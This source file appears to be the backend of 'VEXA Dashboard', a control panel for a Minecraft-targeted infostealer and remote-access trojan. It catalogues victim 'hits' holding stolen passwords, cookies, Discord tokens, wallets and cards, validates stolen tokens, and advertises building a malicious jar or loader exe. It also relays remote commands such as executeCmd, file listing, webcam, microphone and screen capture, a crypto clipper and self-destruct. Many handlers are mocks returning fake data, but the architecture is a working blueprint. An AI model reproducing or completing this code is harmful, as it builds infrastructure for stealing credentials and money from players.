const express = require('express');
const session = require('express-session');
const http = require('http');
const { Server } = require('socket.io');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  transports: ['polling', 'websocket'],
  cors: { origin: true, credentials: true }
});

const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'wax-kuzay';
const DB_PATH = path.join(__dirname, 'data', 'db.json');
const UPLOADS_PATH = path.join(__dirname, 'uploads');

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: 'vexa-dashboard-secret-change-in-prod',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
fs.mkdirSync(UPLOADS_PATH, { recursive: true });

const DEFAULT_DB = { users: [], hits: [], hitFiles: [], nextHitId: 1, sessions: {} };

function loadDB() {
  try {
    const raw = fs.readFileSync(DB_PATH, 'utf8');
    const data = JSON.parse(raw);
    if (!data.users) data.users = [];
    if (!data.hits) data.hits = [];
    if (!data.hitFiles) data.hitFiles = [];
    if (!data.nextHitId) data.nextHitId = 1;
    return JSON.parse(raw);
  } catch {
    return JSON.parse(JSON.stringify(DEFAULT_DB));
  }
}

function saveDB(data) {
  const dir = path.dirname(DB_PATH);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function findUser(query) {
  const db = loadDB();
  if (typeof query === 'string') {
    return db.users.find(u => u.id === query) || db.users.find(u => u.username === query.toLowerCase()) || null;
  }
  if (query.id) return db.users.find(u => u.id === query.id) || null;
  if (query.username) return db.users.find(u => u.username === query.username.toLowerCase()) || null;
  return null;
}

function isAuth(req) {
  if (!req.session || !req.session.userId) return null;
  return findUser(req.session.userId);
}

function requireAuth(req, res, next) {
  const user = isAuth(req);
  if (!user) return res.status(401).json({ error: 'Not authenticated' });
  req.currentUser = user;
  next();
}

app.use(express.static(path.join(__dirname)));

app.get('/auth/discord', (req, res) => res.redirect('/'));

app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, password, passwordConfirm } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
    if (password.length < 8) return res.status(400).json({ error: 'Password at least 8 characters' });
    if (password !== passwordConfirm) return res.status(400).json({ error: 'Passwords do not match' });
    const lower = username.toLowerCase();
    if (lower === ADMIN_USER) return res.status(400).json({ error: 'Username taken' });
    if (findUser({ username: lower })) return res.status(400).json({ error: 'Username already taken' });
    const hash = await bcrypt.hash(password, 10);
    const user = {
      id: uuidv4(), username: lower, password_hash: hash,
      display_name: lower, anonymous: 0, webhook_url: '',
      webhook_enabled: 1, webhook_ping_min_money: '', webhook_ping_on_crypto: 0,
      is_admin: 0, created_at: new Date().toISOString()
    };
    const db = loadDB();
    db.users.push(user);
    saveDB(db);
    req.session.userId = user.id;
    res.json({ success: true, user: { id: user.id, username: user.username, complete: true } });
  } catch (e) {
    console.error('Register error:', e);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/login-local', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });

    if (username.toLowerCase() === ADMIN_USER && password === ADMIN_PASS) {
      const db = loadDB();
      let user = db.users.find(u => u.username === ADMIN_USER);
      if (!user) {
        const hash = await bcrypt.hash(ADMIN_PASS, 10);
        user = {
          id: uuidv4(), username: ADMIN_USER, password_hash: hash,
          display_name: 'Admin', anonymous: 0, webhook_url: '',
          webhook_enabled: 1, webhook_ping_min_money: '', webhook_ping_on_crypto: 0,
          is_admin: 1, created_at: new Date().toISOString()
        };
        db.users.push(user);
      } else {
        user.is_admin = 1;
      }
      saveDB(db);
      req.session.userId = user.id;
      return res.json({ success: true, user: { id: user.id, username: user.username, complete: true, isAdmin: true } });
    }

    const db = loadDB();
    const user = db.users.find(u => u.username === username.toLowerCase());
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
    const valid = await bcrypt.compare(password, user.password_hash);
    if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
    req.session.userId = user.id;
    res.json({ success: true, user: { id: user.id, username: user.username, complete: true } });
  } catch (e) {
    console.error('Login error:', e);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/discord-token', (req, res) => {
  res.status(400).json({ error: 'Discord login disabled' });
});

app.get('/api/me', (req, res) => {
  const user = isAuth(req);
  if (!user) return res.status(401).json({ error: 'Not authenticated' });
  res.json({
    id: user.id, username: user.username, complete: true,
    primaryDiscordId: null, needsDiscord: false,
    displayName: user.display_name || user.username
  });
});

app.get('/api/user/status', requireAuth, (req, res) => {
  const u = req.currentUser;
  res.json({
    premium: !!u.is_admin, free: false, premiumTier: !!u.is_admin,
    displayName: u.display_name || u.username, anonymous: !!u.anonymous,
    webhookUrl: u.webhook_url || '', webhookEnabled: u.webhook_enabled !== 0,
    webhookPingMinMoney: u.webhook_ping_min_money || '',
    webhookPingOnCrypto: !!u.webhook_ping_on_crypto,
    webhookConfigured: !!(u.webhook_url && u.webhook_url.startsWith('http')),
    builds: Math.floor(Math.random() * 5) + 1
  });
});

app.post('/api/user/settings', requireAuth, (req, res) => {
  const db = loadDB();
  const idx = db.users.findIndex(u => u.id === req.currentUser.id);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });
  const u = db.users[idx];
  const { displayName, anonymous, webhookUrl, webhookPingMinMoney, webhookPingOnCrypto, webhookEnabled } = req.body;
  if (displayName !== undefined) u.display_name = displayName;
  if (anonymous !== undefined) u.anonymous = anonymous ? 1 : 0;
  if (webhookUrl !== undefined) u.webhook_url = webhookUrl;
  if (webhookPingMinMoney !== undefined) u.webhook_ping_min_money = webhookPingMinMoney;
  if (webhookPingOnCrypto !== undefined) u.webhook_ping_on_crypto = webhookPingOnCrypto ? 1 : 0;
  if (webhookEnabled !== undefined) u.webhook_enabled = webhookEnabled ? 1 : 0;
  req.currentUser = u;
  saveDB(db);
  res.json({ success: true });
});

app.get('/api/user/hits', requireAuth, (req, res) => {
  const u = req.currentUser;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = Math.max(parseInt(req.query.offset) || 0, 0);
  const sort = req.query.sort || 'newest';
  const search = req.query.search || '';
  const ip = req.query.ip || '';
  const lite = req.query.lite === '1';

  const db = loadDB();
  let hits = db.hits.filter(h => h.user_id === u.id);
  if (search) { const q = search.toLowerCase(); hits = hits.filter(h => h.username.toLowerCase().includes(q) || h.ip.includes(q)); }
  if (ip) hits = hits.filter(h => h.ip === ip);
  hits.sort((a, b) => sort === 'oldest' ? new Date(a.created_at) - new Date(b.created_at) : new Date(b.created_at) - new Date(a.created_at));
  const page = hits.slice(offset, offset + limit);

  if (lite) {
    return res.json(page.map(h => ({
      id: h.id, username: h.username, ip: h.ip, money: h.money, shards: h.shards,
      countryCode: h.country_code, checked: !!h.checked, createdAt: h.created_at
    })));
  }

  res.json(page.map(h => ({
    id: h.id, username: h.username, ip: h.ip, money: h.money, shards: h.shards,
    playtime: h.playtime_ms, country: h.country, countryCode: h.country_code, checked: !!h.checked,
    hasPasswords: h.passwords && h.passwords !== '[]',
    hasCookies: h.cookies && h.cookies !== '[]',
    hasWallets: h.wallets && h.wallets !== '[]',
    hasCreditCards: h.credit_cards && h.credit_cards !== '[]',
    discordTokenCount: JSON.parse(h.discord_tokens || '[]').length,
    createdAt: h.created_at
  })));
});

app.get('/api/user/hits-stats', requireAuth, (req, res) => {
  const db = loadDB();
  const hits = db.hits.filter(h => h.user_id === req.currentUser.id);
  const totalMoney = hits.reduce((s, h) => s + (h.money || 0), 0);
  const totalShards = hits.reduce((s, h) => s + (h.shards || 0), 0);
  const sorted = [...hits].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({
    totalHits: hits.length, totalMoney, totalShards,
    latestHit: sorted[0] ? sorted[0].created_at : null
  });
});

app.get('/api/user/hits-export', requireAuth, (req, res) => {
  const db = loadDB();
  const hours = parseInt(req.query.hours) || 0;
  let hits = db.hits.filter(h => h.user_id === req.currentUser.id);
  if (hours > 0) {
    const cutoff = Date.now() - hours * 3600000;
    hits = hits.filter(h => new Date(h.created_at).getTime() > cutoff);
  }
  hits.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  let txt = 'VEXA Hit Export\n====================\n\n';
  hits.forEach((h, i) => { txt += `[${i + 1}] ${h.username} | ${h.ip} | $${h.money} | ${h.shards} shards | ${h.country}\n`; });
  res.setHeader('Content-Type', 'text/plain');
  res.send(txt);
});

app.get('/api/user/hits-zips-export', requireAuth, (req, res) => {
  const db = loadDB();
  const hours = parseInt(req.query.hours) || 24;
  const cutoff = Date.now() - hours * 3600000;
  const hits = db.hits.filter(h => h.user_id === req.currentUser.id && new Date(h.created_at).getTime() > cutoff);
  res.json({ success: true, count: hits.length, message: 'ZIP bundle with ' + hits.length + ' hits ready (mock)' });
});

app.get('/api/user/hits-discord-tokens', requireAuth, (req, res) => {
  const db = loadDB();
  const hits = db.hits.filter(h => h.user_id === req.currentUser.id && h.discord_tokens !== '[]').sort((a, b) => new Date(b.created_at) - new Date(a.created_at)).slice(0, 700);
  const rows = [];
  hits.forEach(h => {
    const toks = JSON.parse(h.discord_tokens || '[]');
    toks.forEach(t => { rows.push({ hitId: h.id, token: t.token || t, username: t.username || '', email: t.email || '' }); });
  });
  res.json(rows);
});

app.post('/api/user/discord-validate-token', requireAuth, (req, res) => {
  const { token, tokens } = req.body;
  if (typeof token === 'string') {
    return res.json({ ok: token.length > 10 && Math.random() > 0.3 });
  }
  if (!Array.isArray(tokens)) return res.status(400).json({ error: 'tokens array required' });
  res.json(tokens.map(t => ({ ...t, valid: t.token && t.token.length > 10 && Math.random() > 0.3 })));
});

app.post('/api/user/hit/:id/donate', requireAuth, (req, res) => res.json({ success: true, message: 'Hit donated' }));

app.post('/api/hit/:id/checked', requireAuth, (req, res) => {
  const db = loadDB();
  const hit = db.hits.find(h => h.id == req.params.id && h.user_id === req.currentUser.id);
  if (!hit) return res.status(404).json({ error: 'Hit not found' });
  hit.checked = hit.checked ? 0 : 1;
  saveDB(db);
  res.json({ success: true, checked: !!hit.checked });
});

app.get('/api/hit/:id/download', requireAuth, (req, res) => res.status(404).json({ error: 'No download available' }));

app.get('/api/hit/:id/files', requireAuth, (req, res) => {
  res.json([
    { name: 'Discord/Discord_Info.txt', path: 'Discord/Discord_Info.txt', size: 1240 },
    { name: 'Passwords/passwords.txt', path: 'Passwords/passwords.txt', size: 580 },
    { name: 'Cookies/cookies.txt', path: 'Cookies/cookies.txt', size: 3200 },
    { name: 'Wallets/wallets.txt', path: 'Wallets/wallets.txt', size: 210 },
    { name: 'System/system_info.txt', path: 'System/system_info.txt', size: 890 }
  ]);
});

const MOCK_FILES = {
  'Discord/Discord_Info.txt': 'Discord Tokens:\nN2Y4MzA2ZGMtYzZiYy00NjQ1LThiZTItM2U5ZDMzYjA1NzIz\n\nAccounts:\ntest@example.com:password123\n',
  'Passwords/passwords.txt': 'Saved Logins:\nspotify.com: user:pass\nminecraft.net: player1:hunter2\n',
  'Cookies/cookies.txt': '# Netscape HTTP Cookie File\n.minecraft.net TRUE / FALSE 1234567890 session_id abc123\n',
  'Wallets/wallets.txt': 'BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nETH: 0x1234567890abcdef1234567890abcdef12345678\n',
  'System/system_info.txt': 'OS: Windows 11\nCPU: Intel Core i7-12700K\nRAM: 32768 MB\nGPU: NVIDIA GeForce RTX 3070\n'
};

app.get('/api/hit/:id/file', requireAuth, (req, res) => {
  const fp = req.query.path || '';
  const data = MOCK_FILES[fp] || 'No data available';
  res.json({ content: Buffer.from(data).toString('base64'), path: fp });
});

app.get('/api/hit/:id/folder-zip', requireAuth, (req, res) => res.status(404).json({ error: 'Not available' }));

app.get('/api/ip-intel', requireAuth, (req, res) => {
  const ip = req.query.ip || '0.0.0.0';
  res.json({ ip, isp: 'Comcast Cable', organization: 'Comcast', asn: 'AS7922', country: 'United States', countryCode: 'US', region: 'California', city: 'San Francisco', timezone: 'America/Los_Angeles' });
});

app.get('/api/leaderboard/:type', requireAuth, (req, res) => {
  const db = loadDB();
  const hits = db.hits.sort((a, b) => req.params.type === 'money' ? (b.money || 0) - (a.money || 0) : new Date(b.created_at) - new Date(a.created_at)).slice(0, 50);
  res.json(hits.map((h, i) => ({ rank: i + 1, username: h.username || 'unknown', value: req.params.type === 'money' ? h.money : 1, shards: h.shards, time: h.created_at })));
});

app.get('/api/checkstats/:username', requireAuth, (req, res) => {
  res.json({ username: req.params.username, rank: Math.floor(Math.random() * 10000) + 1, kills: Math.floor(Math.random() * 500), deaths: Math.floor(Math.random() * 300), playtime: Math.floor(Math.random() * 10000000), money: Math.floor(Math.random() * 500000), shards: Math.floor(Math.random() * 10000) });
});

app.get('/api/recheck-stats/:username', requireAuth, (req, res) => res.json({ success: true, message: 'Stats refreshed' }));

app.post('/api/minecraft/refresh-token', requireAuth, (req, res) => {
  res.json({ success: true, newToken: 'refreshed_' + ((req.body.token || '').slice(0, 10)), message: 'Token refreshed' });
});

const buildUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
app.post('/api/buildmod', requireAuth, buildUpload.array('files'), (req, res) => {
  const isExe = req.body.standalone === 'true' || req.body.standalone === true;
  const filename = isExe ? 'VEXA-loader.exe' : 'VEXA.jar';
  const buf = Buffer.alloc(1024 * 512);
  buf.write('VEXA_BUILD:' + Date.now());
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.send(buf);
});

app.get('/logout', (req, res) => { req.session.destroy(() => res.redirect('/')); });

const PC_NAMES = ['DESKTOP-PC', 'GAMING-RIG', 'WORK-LAPTOP', 'SERVER-01', 'MAIN-PC'];
const COUNTRIES = [
  { code: 'US', name: 'United States', ip: '192.168.1.' },
  { code: 'GB', name: 'United Kingdom', ip: '10.0.0.' },
  { code: 'DE', name: 'Germany', ip: '172.16.0.' },
  { code: 'CA', name: 'Canada', ip: '192.168.2.' },
  { code: 'AU', name: 'Australia', ip: '10.0.1.' }
];

const clientPcs = {};

function generateMockClients(userId) {
  const count = Math.floor(Math.random() * 3) + 1;
  const clients = [];
  for (let i = 0; i < count; i++) {
    const c = COUNTRIES[Math.floor(Math.random() * COUNTRIES.length)];
    const id = uuidv4().slice(0, 8);
    clients.push({
      id, clientId: id, pcName: PC_NAMES[Math.floor(Math.random() * PC_NAMES.length)],
      ip: c.ip + Math.floor(Math.random() * 254 + 1),
      countryCode: c.code, hasCamera: Math.random() > 0.5
    });
  }
  return clients;
}

function generateMockHit(userId) {
  const c = COUNTRIES[Math.floor(Math.random() * COUNTRIES.length)];
  const usernames = ['Steve_123', 'Alex_Gamer', 'NotchFan', 'CreeperKing', 'DiamondMiner', 'NetherLord', 'RedstoneGenius'];
  return {
    id: null,
    user_id: userId,
    username: usernames[Math.floor(Math.random() * usernames.length)] + Math.floor(Math.random() * 1000),
    ip: c.ip + Math.floor(Math.random() * 254 + 1),
    money: Math.floor(Math.random() * 50000) + 100,
    shards: Math.floor(Math.random() * 500) + 10,
    playtime_ms: Math.floor(Math.random() * 86400000) + 3600000,
    country: c.name,
    country_code: c.code,
    checked: Math.random() > 0.7 ? 1 : 0,
    discord_tokens: Math.random() > 0.6 ? JSON.stringify([{ token: 'mfa.' + uuidv4().replace(/-/g, '').slice(0, 40), username: 'discord_user_' + Math.floor(Math.random() * 1000) }]) : '[]',
    passwords: Math.random() > 0.5 ? JSON.stringify([{ site: 'minecraft.net', username: 'player' + Math.floor(Math.random() * 1000), password: 'hunter' + Math.floor(Math.random() * 100) }]) : '[]',
    cookies: Math.random() > 0.5 ? '[]' : JSON.stringify([{ domain: '.minecraft.net', name: 'session', value: 'abc123' }]),
    wallets: Math.random() > 0.7 ? JSON.stringify([{ currency: 'BTC', address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' }]) : '[]',
    credit_cards: '[]',
    created_at: new Date(Date.now() - Math.floor(Math.random() * 7 * 86400000)).toISOString()
  };
}

io.on('connection', (socket) => {
  let joinedUserId = null;

  socket.on('join-user', (userId) => {
    joinedUserId = String(userId);
    socket.join(joinedUserId);

    const db = loadDB();
    const user = db.users.find(u => u.id === joinedUserId || u.username === joinedUserId);
    if (user && db.hits.filter(h => h.user_id === user.id).length < 3) {
      for (let i = 0; i < 5; i++) {
        const hit = generateMockHit(user.id);
        hit.id = db.nextHitId++;
        db.hits.push(hit);
      }
      saveDB(db);
    }

    const clients = generateMockClients(joinedUserId);
    clientPcs[joinedUserId] = clients;
    socket.emit('clients-update', clients);

    if (Math.random() > 0.7) {
      setTimeout(() => {
        const db2 = loadDB();
        const user2 = db2.users.find(u => u.id === joinedUserId || u.username === joinedUserId);
        if (user2) {
          const hit = generateMockHit(user2.id);
          hit.id = db2.nextHitId++;
          db2.hits.push(hit);
          saveDB(db2);
          const h = { ...hit };
          delete h.user_id;
          io.to(joinedUserId).emit('new-hit', h);
        }
      }, 15000);
    }
  });

  let pingTimers = {};

  socket.on('command-to-client', (data) => {
    const delay = 100 + Math.random() * 400;
    setTimeout(() => {
      const response = { _fromClientSocketId: data.targetSocketId, requestId: data.payload?.requestId || 'unknown', data: { success: true } };

      if (data.command === 'listFiles') {
        response.data = { path: data.payload?.path || 'C:\\', items: [
          { name: 'Desktop', isDir: true }, { name: 'Downloads', isDir: true },
          { name: 'Documents', isDir: true }, { name: 'Pictures', isDir: true },
          { name: 'README.txt', isDir: false }, { name: 'passwords.txt', isDir: false },
          { name: 'config.json', isDir: false }
        ]};
      } else if (data.command === 'ping') {
        response.data = { id: data.payload?.id };
        response.rttRelayMs = Math.floor(Math.random() * 80) + 5;
        response.requestId = 'ping_rtt';
      } else if (data.command === 'list_processes') {
        response.data = { processes: [
          { pid: 4, name: 'System' }, { pid: 1234, name: 'explorer.exe' },
          { pid: 5678, name: 'chrome.exe' }, { pid: 9012, name: 'Discord.exe' },
          { pid: 3456, name: 'java.exe' }, { pid: 7890, name: 'RuntimeBroker.exe' }
        ]};
      } else if (data.command === 'get_clipboard') {
        response.data = 'Copied text from remote clipboard';
      } else if (data.command === 'get_remote_caps') {
        response.data = { isAdmin: true, force_admin: false };
      } else if (data.command === 'self_destruct') {
        socket.emit('client-response', { _fromClientSocketId: data.targetSocketId, requestId: data.payload?.requestId, data: { success: true } });
        return;
      } else if (data.command === 'executeCmd') {
        response.data = { stdout: 'Microsoft Windows [Version 10.0.22621.1]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Users\\User>' };
      } else if (data.command === 'get_clipper' || data.command === 'start_screen' || data.command === 'start_cam' || data.command === 'start_mic_audio' || data.command === 'start_desktop_audio' || data.command === 'stop_screen' || data.command === 'stop_cam') {
        response.data = { success: true };
      }

      socket.emit('client-response', response);
    }, delay);
  });

  socket.on('set-clipper-config', () => {});
  socket.on('set-clipper-config-one', () => {});
  socket.on('get-clipper-for-client', (data) => {
    socket.emit('client-response', {
      requestId: 'clipper_config',
      data: { btc: { enabled: false, address: '' }, eth: { enabled: false, address: '' }, ltc: { enabled: false, address: '' }, usdc: { enabled: false, address: '' }, usdt: { enabled: false, address: '' } }
    });
  });

  socket.on('disconnect', () => {
    Object.values(pingTimers).forEach(t => clearInterval(t));
  });
});

app.use((req, res) => res.sendFile(path.join(__dirname, 'index.html')));

server.listen(PORT, HOST, () => {
  console.log(`VEXA Dashboard running on port ${PORT}`);
});
